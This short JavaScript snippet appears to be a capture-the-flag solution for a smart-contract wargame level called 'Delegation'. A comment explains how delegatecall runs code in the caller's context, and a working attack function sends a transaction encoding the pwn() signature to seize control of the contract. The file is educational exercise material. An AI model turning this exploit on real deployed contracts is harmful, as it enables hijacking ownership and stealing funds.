/**

Delegation
 
Vulnerability:
Delegatecall executes called contract in the context of calling contract
So delegatecall might cause unwanted updates in the state of the calling contract

Preventative Techniques:
Be careful about which contract you delegatecall to

*/

const attack = async () => {

    await sendTransaction({ 
        from: player, 
        to: contract.address, 
        data: web3.eth.abi.encodeFunctionSignature("pwn()") 
    });
}
